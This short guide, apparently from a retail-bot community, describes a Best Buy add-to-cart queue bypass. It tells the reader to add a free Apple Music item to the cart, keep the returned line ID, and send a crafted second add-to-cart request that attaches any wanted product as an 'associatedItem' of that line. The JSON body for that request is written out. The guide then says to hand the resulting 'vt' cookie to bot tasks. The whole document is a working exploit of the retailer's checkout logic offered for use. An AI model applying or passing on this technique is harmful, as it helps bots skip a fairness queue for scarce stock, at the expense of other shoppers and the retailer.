Bestbuy ATC Queue Bypass

1. Add [this item](https://www.bestbuy.com/site/apple-free-apple-music-for-6-months-new-subscribers-only/6451501.p?skuId=6451501) to cart and store the ID from it obtained from `response.summaryItems[0].lineId`

2. Send a second ATC request with the POST body below using the same cookie jar as the first request
```json
{
    "items":[{
        "skuId": SKU_YOU_WANT_TO_ADD,
        "parentLineItemId": ID_STORED_FROM_FIRST_REQ,
        "associationType": "associatedItem"
    }]
}
```

3. Deliver the `vt` cookie to tasks to populate the cart

4. Account is required for checkout